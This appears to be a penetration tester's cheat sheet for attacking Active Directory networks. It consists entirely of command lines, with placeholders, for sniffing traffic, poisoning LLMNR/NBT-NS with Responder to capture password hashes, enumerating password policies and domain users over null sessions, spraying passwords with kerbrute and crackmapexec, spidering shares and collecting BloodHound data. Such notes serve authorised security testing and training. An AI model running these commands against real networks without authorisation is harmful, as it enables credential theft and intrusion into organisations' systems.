### Sniff Traffic:
```
sudo tcpdump -i ens224
```
### Listen for hashes - LLMNR/NBT-NS Poisoning: 
```
sudo responder -I ens224
```
### Password Policy:
```
crackmapexec smb <IP> -u <USER> -p <PASSWORD> --pass-pol
rpcclient -U "" -N <IP>
querydominfo
enum4linux-ng -P <IP> -oA <OUTPUT>
ldapsearch -h <IP> -x -b "DC=<DOMAIN>,DC=<LOCAL>" -s sub "*"
```
### Password Spraying:
```
kerbrute passwordspray -d <DOMAIN> --dc <IP> <USER_LIST>  <PASSWORD>
sudo crackmapexec smb <IP> -u <USER_LIST> -p <PASSWORD>
```
### Enumerate AD accounts: 
```
kerbrute userenum -d <DOMAIN> --dc <IP> <WORDLIST> -o valid_ad_users
rpcclient -U "" -N <IP>
enumdomusers
```
### Get domain object info:
```
sudo crackmapexec smb -u <USER> -p <PASSWORD> --users
sudo crackmapexec smb -u <USER> -p <PASSWORD> --groups
sudo crackmapexec smb -u <USER> -p <PASSWORD> --loggedon-users
sudo crackmapexec smb -u <USER> -p <PASSWORD> --shares
sudo crackmapexec smb -u <USER> -p <PASSWORD> -M spider_plus --share <SHARE>
smbmap -u <USER> -p <PASSWORD> -d <DOMAIN> -H <IP> -R <SHARE> --dir-only
```
### Bloodhound Collection:
```
sudo bloodhound-python -u <USER> -p <PASSWORD> -ns <NS_IP> -d <DOMAIN> -c all
```
